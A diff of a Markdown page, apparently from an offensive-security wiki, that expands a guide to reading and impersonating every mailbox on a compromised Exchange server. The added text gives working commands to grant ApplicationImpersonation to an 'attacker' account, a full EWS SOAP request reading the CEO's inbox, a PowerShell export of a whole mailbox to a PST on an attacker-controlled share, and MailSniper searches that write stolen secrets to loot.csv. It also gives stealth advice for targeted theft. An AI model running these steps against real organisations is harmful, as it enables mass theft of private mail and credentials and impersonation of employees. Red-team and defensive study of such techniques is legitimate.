@@ -1,56 +1,103 @@
 ---
-title: "Mailbox access: reading and impersonating mailboxes"
-description: "Post-compromise use of Exchange mailboxes: searching your own and other users' mail for credentials and intel, granting ApplicationImpersonation to read every mailbox, and sending as trusted users for internal phishing."
+title: "Mailbox access: reading and impersonating every mailbox"
+description: "Post-credential and post-RCE mailbox access on Exchange: EWS ApplicationImpersonation to read any mailbox, the raw EWS FindItem/GetItem SOAP calls, Exchange Management Shell Get-Mailbox and New-MailboxExportRequest to dump a mailbox to PST, and MailSniper self and global mail search for credentials and intel."
 keywords:
-  - mailbox
+  - mailbox access
   - ApplicationImpersonation
-  - EWS
+  - EWS FindItem
+  - New-MailboxExportRequest
   - MailSniper
-  - internal phishing
 ---
 
 # Mailbox access
 
-Mailboxes are a target in their own right: they hold passwords, password-reset links, VPN and app secrets, network diagrams, and the trust to send mail **as** a real employee. With one credential you read your own mail; with the right Exchange role you read **everyone's**.
+Mailboxes hold passwords, reset links, VPN and app secrets, network diagrams, and the standing trust to send mail **as** a real employee. With one credential you read your own mail; with the `ApplicationImpersonation` role or the Exchange Management Shell you read **everyone's**. The access method depends on what you hold: a mailbox credential routes through EWS, an Exchange-admin context or `SYSTEM` on the box routes through the management shell.
 
-## Searching mail
+## Grant yourself the read: ApplicationImpersonation
 
-```powershell
-# MailSniper: search your own mailbox for secrets (terms use -like, so wrap in wildcards)
-Invoke-SelfSearch -Mailbox user@example.local -Terms "*password*","*vpn*","*secret*"
-
-# With the ApplicationImpersonation role, search every mailbox in the org
-Invoke-GlobalMailSearch -ImpersonationAccount user -ExchHostname <exch> -Terms "*password*"
-```
-
-## Reading everyone: ApplicationImpersonation
-
-The **`ApplicationImpersonation`** RBAC role lets an account act as any mailbox over EWS. If you reach an Exchange admin (or compromise the server), grant it to a controlled account and read the whole organisation's mail:
+The **`ApplicationImpersonation`** RBAC role lets one account act as any mailbox over EWS. From an Exchange admin context (or `SYSTEM` after an [RCE chain](rce-chains/index.md), via the local Exchange Management Shell), assign it to a controlled account:
 
 ```powershell
-# As an Exchange admin: grant impersonation, then search globally
-New-ManagementRoleAssignment -Role ApplicationImpersonation -User attacker
+# Exchange Management Shell: give a controlled account org-wide impersonation
+New-ManagementRoleAssignment -Name "ar-impersonate" -Role ApplicationImpersonation -User attacker
+Get-ManagementRoleAssignment -Role ApplicationImpersonation   # confirm the grant took
 ```
 
-## Sending as a user
+That account can now authenticate to EWS and set the impersonated identity to any mailbox, with no per-mailbox permission and no password for the victim.
 
-Beyond reading, mailbox access enables **internal phishing** from a trusted sender: replying within real threads, or sending from an executive's address, defeats the usual "external sender" suspicion. Transport and inbox **rules** can also be planted for persistence (auto-forward, or triggering on a keyword).
+## Read a mailbox over raw EWS
+
+EWS is a SOAP API at `/ews/exchange.asmx`. `FindItem` lists items in a folder, `GetItem` fetches a message body. The `ExchangeImpersonation` SOAP header is what spends the role above, naming the mailbox to act as:
+
+```http
+POST /ews/exchange.asmx HTTP/1.1
+Host: mail.example.com
+Authorization: Basic <base64 attacker creds>
+Content-Type: text/xml; charset=utf-8
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
+  <soap:Header>
+    <t:ExchangeImpersonation><t:ConnectingSID>
+      <t:PrimarySmtpAddress>ceo@example.com</t:PrimarySmtpAddress>
+    </t:ConnectingSID></t:ExchangeImpersonation>
+  </soap:Header>
+  <soap:Body>
+    <m:FindItem Traversal="Shallow">
+      <m:ItemShape><t:BaseShape>IdOnly</t:BaseShape></m:ItemShape>
+      <m:ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></m:ParentFolderIds>
+    </m:FindItem>
+  </soap:Body>
+</soap:Envelope>
+```
+
+A `200` with a `FindItemResponseMessage` listing `ItemId` values confirms the impersonation worked and you are reading the CEO's inbox; take each `ItemId` into a `GetItem` request to pull the body. A `401` means the attacker credential is wrong; a SOAP fault `ErrorImpersonateUserDenied` means the account lacks the role, so revisit the grant above.
+
+## Dump a whole mailbox to PST
+
+From an Exchange-admin or `SYSTEM` context, the management shell exports an entire mailbox to a PST on a share you control, which you then open offline:
+
+```powershell
+# Export a target mailbox to a PST on an attacker-reachable UNC path
+New-MailboxExportRequest -Mailbox ceo@example.com -FilePath \\10.10.14.7\share\ceo.pst
+Get-MailboxExportRequest | Get-MailboxExportRequestStatistics   # watch it reach "Completed"
+# enumerate who is worth exporting
+Get-Mailbox -ResultSize unlimited | Select Name,PrimarySmtpAddress,Database
+```
+
+`New-MailboxExportRequest` requires the `Mailbox Import Export` role, which an Exchange admin can self-assign the same way as above. When the status reads `Completed`, the PST on your share is the full mailbox, offline and searchable.
+
+## Search mail at scale
+
+MailSniper wraps EWS to grep mail for secrets, either your own box or, with impersonation, the entire organization:
+
+```powershell
+# Your own mailbox (terms are -like, so wrap in wildcards)
+Invoke-SelfSearch -Mailbox john.doe@example.com -Terms "*password*","*vpn*","*secret*","*apikey*"
+# Every mailbox, using the ApplicationImpersonation account granted above
+Invoke-GlobalMailSearch -ImpersonationAccount attacker -ExchHostname mail.example.com `
+  -Terms "*password*","*credential*" -OutputCsv loot.csv
+```
+
+`loot.csv` is the hit list: sender, mailbox, subject, and matched snippet. In practice the fastest wins are helpdesk reset mails, service-account passwords, and app secrets sent in cleartext.
 
 ## Exploitation notes
 
-- Mail search is often the **fastest path to more credentials**: helpdesk resets, service-account passwords, and app secrets are routinely emailed in cleartext.
-- `ApplicationImpersonation` is quieter than dumping the mailbox store and does not need SYSTEM on the server, only the role.
-- Auto-forward or client rules are durable **persistence** and data exfiltration that survive a password reset of the victim.
-- Sending as a trusted internal user is a strong pivot for lateral social-engineering once you hold one mailbox.
+- Mail search is routinely the **fastest path to more credentials**: resets, service-account passwords, and app secrets live in cleartext in inboxes.
+- `ApplicationImpersonation` over EWS is quieter than `New-MailboxExportRequest`, which writes an export request object and touches a share; prefer EWS read for targeted theft, PST export only when you want the whole box offline.
+- Impersonation does not need `SYSTEM` on the server, only the role, so a compromised Exchange admin is enough; conversely, after an RCE chain the local management shell runs effectively unrestricted.
+- Holding a mailbox also enables sending **as** a trusted internal user and planting client-side [Outlook abuse](outlook-client-abuse.md) and server-side [mail-flow persistence](mail-flow-persistence.md).
 
 ## Tools
 
-- **MailSniper** (`Invoke-SelfSearch`, `Invoke-GlobalMailSearch`, `Add-MailboxPermission`): search and impersonation.
-- **ruler**: inbox-rule and form-based mailbox persistence.
-- **Exchange Management Shell / EWS**: role grants and mailbox operations.
+- **MailSniper** (`Invoke-SelfSearch`, `Invoke-GlobalMailSearch`, `Get-GlobalAddressList`): EWS mail search and impersonation.
+- **Exchange Management Shell** (`New-ManagementRoleAssignment`, `New-MailboxExportRequest`, `Get-Mailbox`): role grants and PST export.
+- **impacket / exchangelib / ruler**: scripted EWS and MAPI mailbox operations.
 
 ## References
 
 - [MailSniper (dafthack)](https://github.com/dafthack/MailSniper)
+- [Microsoft: Impersonation and EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)
+- [Microsoft: New-MailboxExportRequest](https://learn.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest)
 - [Black Hills InfoSec: attacking Exchange with MailSniper](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)
-- [Microsoft: ApplicationImpersonation role](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)
